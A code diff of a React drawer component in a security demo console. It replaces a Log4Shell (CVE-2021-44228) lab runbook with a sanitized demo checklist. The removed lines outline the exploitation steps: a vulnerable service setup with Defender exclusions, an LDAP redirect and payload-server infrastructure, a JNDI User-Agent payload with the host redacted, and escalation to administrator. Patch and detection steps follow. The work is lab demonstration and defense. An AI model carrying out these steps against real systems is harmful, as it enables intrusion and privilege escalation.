@@ -1,6 +1,5 @@
-// RunbookDrawer: right-hand drawer with structured runbook content from
-// LOG4SHELL_INSTRUCTIONS.md. All sensitive strings sanitized via sanitize().
-// Slides in from right when open.
+// RunbookDrawer: right-hand drawer with the judge-safe demo operator flow.
+// It intentionally avoids exploit steps and raw payload material.
 
 import { sanitize } from '../lib/sanitize';
 
@@ -15,118 +14,79 @@ interface RunbookSection {
   steps: string[];
 }
 
-// Sanitized runbook sections derived from LOG4SHELL_INSTRUCTIONS.md
-// All real IPs, credentials, and raw exploit commands are replaced.
+// Derived from presentation/demo_checklist.md. Keep this operator-facing and
+// non-actionable: no payloads, no live targets, no raw scrape content.
 const SECTIONS: RunbookSection[] = [
   {
-    id: 'overview',
-    heading: 'OVERVIEW',
+    id: 'mission',
+    heading: 'MISSION',
     steps: [
-      'Target: Windows 11 system running VulnerableApp (Java 8 + Log4j 2.14.0) as LocalSystem service.',
-      'Scope: CVE-2021-44228 Log4Shell — JNDI injection via HTTP User-Agent header.',
-      'Goal: Demonstrate privilege escalation from low-privilege user to LocalSystem.',
-      'CISA KEV rank #4 · CVSS 10.0 · EPSS 0.97 (99.9th percentile).',
+      'Prophet predicts the strike window, strike vector, and exploit class, then renders the defense artifact.',
+      'Keep the demo sector-level and localhost-only. Do not name live targets or raw sources.',
+      'Use DEMO REFRESH and LOAD FIXTURE as the reliable path; use RUN SCRAPER VM only after readiness checks pass.',
     ],
   },
   {
-    id: 'step1',
-    heading: 'STEP 1 — COPY SETUP SCRIPT',
+    id: 'services',
+    heading: 'SERVICES',
     steps: [
-      'Copy log4shell_setup.py to the lab machine via SCP.',
-      'Target machine: [LAB-HOST] · connect via SSH as [OPERATOR] (admin account).',
-      'Destination: C:\\Users\\[OPERATOR]\\Desktop\\log4shell_setup.py',
+      'Run the console: cd prophet-console && npm run dev.',
+      'Run the local control server: cd prophet-console && npm run dev:control.',
+      'Open http://127.0.0.1:5173 and enter the operator console.',
+      'Optional VM check: world-side/scripts/check-scraper-vm.sh.',
     ],
   },
   {
-    id: 'step2',
-    heading: 'STEP 2 — RUN SETUP AS ADMINISTRATOR',
+    id: 'world',
+    heading: 'FORECAST FLOW',
     steps: [
-      'Open PowerShell as Administrator on the target machine.',
-      'Execute: python log4shell_setup.py',
-      'The script will: add Defender exclusions, download Java 8, download Log4j 2.14.0, build VulnerableApp, install as Windows service (LocalSystem).',
+      'Click DEMO REFRESH to rebuild the forecast from sanitized fixture chatter.',
+      'Read the two deliverables aloud: Attack Method / Strike Vector and Timeframe / Strike Window.',
+      'Click the top strike-window bar to show trigger signals and historical analogies.',
+      'If RUN SCRAPER VM is used, confirm the status line says the VM run completed before narrating it as live.',
     ],
   },
   {
-    id: 'step3',
-    heading: 'STEP 3 — VERIFY SETUP',
+    id: 'cyber',
+    heading: 'CYBER FIXTURE FLOW',
     steps: [
-      'Run check_setup.py on the target to verify the environment.',
-      'Confirm: VulnerableApp service RUNNING, port 8080 LISTENING.',
-      'Test basic connectivity: GET http://[LAB-HOST]:8080/ → should return "Request logged successfully".',
+      'Click LOAD FIXTURE in Defence Artifacts to load the cyber-side Direction C artifact.',
+      'Confirm Exploit Status flips to BLOCKED and the post-patch validation excerpt appears.',
+      'Show PATCH and SIGMA tabs as the generated zero-day defense output.',
+      'Use INITIATE PROPHET LOOP for the full replay stream if time allows.',
     ],
   },
   {
-    id: 'step4',
-    heading: 'STEP 4 — SHOW PRE-EXPLOIT PRIVILEGES',
+    id: 'talktrack',
+    heading: 'TALK TRACK',
     steps: [
-      'SSH as low-privilege account [GUEST].',
-      'Run: whoami → should show [GUEST] (low-privilege).',
-      'Run: whoami /priv → confirm limited privileges, no SeDebugPrivilege.',
-      'Run: net localgroup administrators → [GUEST] should NOT be listed.',
+      'Problem: reactive patching starts after weaponization and disclosure.',
+      'Method: Forecaster predicts when and how; Exploit Engine predicts what; Console renders the defense.',
+      'Safety: scraper VM collects, sanitizer validates, main box only sees sanitized JSONL.',
+      'Close: predict the strike, generate the defense, ship before the campaign runs.',
     ],
   },
   {
-    id: 'step5',
-    heading: 'STEP 5 — SET UP EXPLOIT INFRASTRUCTURE',
+    id: 'recovery',
+    heading: 'RECOVERY',
     steps: [
-      'Start LDAP redirect server on the operator machine (Marshalsec).',
-      'LDAP server redirects class load requests to the HTTP payload server.',
-      'Start HTTP server serving the compiled exploit class (port 8888).',
-      'Note: In the Prophet demo, the Qwen executor handles this infrastructure automatically.',
+      'If the VM is unreachable, use DEMO REFRESH and say live collection is disabled for stage safety.',
+      'If the control server is offline, start npm run dev:control and retry the fixture buttons.',
+      'If the replay stalls, load the cyber fixture and continue from the defense panels.',
+      'If two failures happen, finish the pitch using the script and offer a booth rerun.',
     ],
   },
   {
-    id: 'step6',
-    heading: 'STEP 6 — EXECUTE LOG4SHELL',
+    id: 'opsec',
+    heading: 'OPSEC',
     steps: [
-      'Send crafted HTTP request to VulnerableApp:',
-      '  User-Agent: ${jndi:ldap://[REDACTED]/Exploit}',
-      'Log4j 2.14.0 processes the JNDI lookup without sanitization.',
-      'LDAP referral fires → remote class loaded → static initializer runs as LocalSystem.',
-      'The Prophet agent validates exploitability via controlled OOB callback (no class execution during validation).',
-    ],
-  },
-  {
-    id: 'step7',
-    heading: 'STEP 7 — VERIFY PRIVILEGE ESCALATION',
-    steps: [
-      'Check exploit evidence file: C:\\lab\\exploit_proof.txt (created as SYSTEM).',
-      'Confirm privilege escalation: [GUEST] added to Administrators group.',
-      'In Prophet demo: this phase generates the controlled-callback indicator only.',
-    ],
-  },
-  {
-    id: 'step8',
-    heading: 'STEP 8 — APPLY PATCH (PHASE IV)',
-    steps: [
-      'Primary: set JVM flag -Dlog4j2.formatMsgNoLookups=true (disables JNDI lookups globally).',
-      'Secondary: update log4j2.xml PatternLayout to %msg{nolookups}.',
-      'Fallback: remove org/apache/logging/log4j/core/lookup/JndiLookup.class from log4j-core JAR.',
-      'Restart VulnerableApp service after applying patch.',
-    ],
-  },
-  {
-    id: 'step9',
-    heading: 'STEP 9 — VERIFY PATCH',
-    steps: [
-      'Re-run Nuclei template against patched target.',
-      'Expected result: NOT VULNERABLE · no JNDI callback received.',
-      'Deploy generated Sigma rule to SIEM for ongoing detection.',
-    ],
-  },
-  {
-    id: 'cleanup',
-    heading: 'CLEANUP',
-    steps: [
-      'Stop and remove VulnerableApp service: net stop VulnerableApp && sc delete VulnerableApp',
-      'Remove lab directory: Remove-Item -Recurse -Force C:\\lab',
-      'Remove Defender exclusions: Remove-MpPreference -ExclusionPath "C:\\lab"',
-      'Remove [GUEST] from administrators group: net localgroup administrators [GUEST] /delete',
+      'No raw scraper output on screen.',
+      'No secrets, SSH keys, .env.local files, session files, or passwords on screen.',
+      'No exploit payload syntax or live target indicators in the narration.',
+      'Keep all cyber output framed as localhost sandbox validation and defense generation.',
     ],
   },
 ];
-
-const D = '$';
 
 export function RunbookDrawer({ open, onClose }: RunbookDrawerProps) {
   return (
@@ -147,7 +107,7 @@ export function RunbookDrawer({ open, onClose }: RunbookDrawerProps) {
         aria-hidden={!open}
       >
         <div className="runbook-header">
-          <div className="runbook-eyebrow">LOG4SHELL RUNBOOK</div>
+          <div className="runbook-eyebrow">PROPHET DEMO RUNBOOK</div>
           <button
             className="runbook-close"
             onClick={onClose}
@@ -158,11 +118,11 @@ export function RunbookDrawer({ open, onClose }: RunbookDrawerProps) {
         </div>
 
         <div className="runbook-subheader">
-          <span className="runbook-cve">CVE-2021-44228</span>
+          <span className="runbook-cve">PS4 DIGITAL DEFENSE</span>
           <span className="runbook-sep">·</span>
-          <span>Apache Log4j 2 · JNDI Injection / RCE</span>
+          <span>Forecaster + Exploit Engine + Console</span>
           <span className="runbook-sep">·</span>
-          <span>CVSS 10.0</span>
+          <span>fixture-safe mode</span>
         </div>
 
         <div className="runbook-body">
@@ -177,7 +137,7 @@ export function RunbookDrawer({ open, onClose }: RunbookDrawerProps) {
                   <li key={i} className="runbook-step">
                     <span className="runbook-step-num">{i + 1}.</span>
                     <span className="runbook-step-text">
-                      {sanitize(step.replace('${jndi:ldap://[REDACTED]/Exploit}', `${D}{jndi:ldap://[REDACTED]/Exploit}`))}
+                      {sanitize(step)}
                     </span>
                   </li>
                 ))}
@@ -189,9 +149,9 @@ export function RunbookDrawer({ open, onClose }: RunbookDrawerProps) {
         <div className="runbook-footer">
           <span>LAB-001</span>
           <span className="runbook-footer-sep">·</span>
-          <span>LOG4SHELL</span>
+          <span>PROPHET</span>
           <span className="runbook-footer-sep">·</span>
-          <span>CVE-2021-44228</span>
+          <span>DEMO SAFE</span>
           <span className="runbook-footer-sep">·</span>
           <span>CLASSIFICATION FOUO</span>
         </div>
